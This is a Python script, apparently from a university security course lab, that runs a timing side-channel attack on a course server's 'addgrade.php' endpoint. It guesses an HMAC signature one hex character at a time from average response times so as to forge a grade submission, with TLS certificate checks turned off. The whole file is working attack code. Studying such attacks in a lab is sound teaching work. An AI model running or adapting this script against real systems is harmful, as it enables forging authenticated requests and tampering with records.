import hmac
import hashlib
import requests
import urllib3
import time

def getAverage(URL, parameters, iterations):
    total = 0
    for j in range (0, iterations):  
        total += requests.get(url = URL, params = parameters, verify=False).elapsed.total_seconds()
    return total / iterations

if __name__ == '__main__':
    start = time.time()
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # Removes ssl related warnings. 
    name = 'Micaela'
    grade = '4'
    key = bytes('k', encoding='utf8')
    REAL_SIGNATURE = '0bd7fb428bea810a03c0'
    URL = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php"
    concat = bytes(name, encoding='utf8') + bytes(grade, encoding='utf8')
    signature = hmac.new(key, concat, hashlib.sha1).hexdigest()[:20]
    elapsed = 0
    signature = list(signature)
    bestChar = None
    for i in range (0,20):
        for char in '0123456789abcdef':
            signature[i] = char
            parameters = {'name':name, 'grade':grade, 'signature':''.join(signature)} 
            average = getAverage(URL, parameters, 5)
            if (average > elapsed):
                bestChar= char
                elapsed = average
                print ("charPos:", i, "Char:", char, "Average:", average, "-> NEW BEST TIME, THE CHAR IS:", char)
            else:
                print("charPos:", i, "Char:", char, "Average:", average)
        signature[i] = bestChar
        print("Chosen char:", bestChar)
        print("------------------------")
        elapsed = 0

    parameters = {'name':name, 'grade':grade, 'signature':''.join(signature)}        
    result = requests.get(url = URL, params = parameters, verify=False)
    data = result.json()

    if(data == 1):
        print("Success! Signature is:", ''.join(signature))
    else:
        print("Unsuccessful answer from server is:", data, "Signature:",signature)
    end = time.time()
    print("Time:", end - start)
